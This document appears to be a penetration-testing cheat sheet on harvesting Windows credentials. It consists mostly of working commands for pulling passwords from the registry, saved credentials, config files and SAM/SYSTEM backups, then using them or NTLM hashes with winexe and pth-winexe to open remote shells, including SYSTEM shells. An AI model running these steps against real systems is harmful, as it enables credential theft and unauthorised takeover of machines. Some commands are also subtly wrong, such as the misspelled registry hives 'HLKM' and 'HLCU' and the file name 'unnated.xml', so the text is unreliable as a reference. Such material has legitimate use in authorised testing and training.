---
description: Password Gathering
---

# Password Gathering

### Registry

Some programs stores passwords in plaintext in the registry.

Search manually:

```
reg query HLKM /f password /t REG_SZ /s
reg query HLCU /f password /t REG_SZ /s
```

Search with winPEAS:

```
.\winpeas.exe quiet filesinfo userinfo
```

Found some creds? Spawn a shell with winexe or psexec from Kali:

```powershell
winexe -U '$user%$password' //$IPADDRESS cmd.exe

#If the user is and Admin we can get a shell as system:
winexe -U '$user%$password' --system //$IPADDRESS cmd.exe
```

### Saved Creds

Windows has a "runas" command which allows users to run commands with the privileges of other users. If this credentials are saved we don't need to know them and we can use to execute any binary in the context of that user.

Check for saved creds:

```
.\winpeas.exe quiet cmd windowscreds
```

If the output shows that there is a saved password (Currently Stored Credentials) we can run "runas" command as that user.

Check again with:

```
cmdkey /list
```

Then run:

```
runas /savecred /user:$user C:\XX\xx.exe
```

### Configuration files

There might be some configuration files in the system with credentials inside (example: unnated.xml).

Search for configuration files:

```powershell
#Current directory for files with string "pass"
dir /s *pass* == *.config

#Recursively search for the contents of files in the current directory that contain "password":
findstr /si password *.xml *.ini *.txt
```

Search with WinPEAS:

```
.\winpeas.exe quiet cmd searchfast filesinfo
```

### SAM & SYSTEM

Is there a backup of the SAM & SYSTEM files (C:\Windows\Repair) or (C\Windows\System32\config\RegBack)?

Found any hashes? Spawn a shell:

```powershell
pth-winexe -U '$username%LM:NTLM' //$IPADDRESS cmd.exe

#To spawn a system shell:
pth-winexe --system -U '$username%LM:NTLM' //$IPADDRESS cmd.exe
```
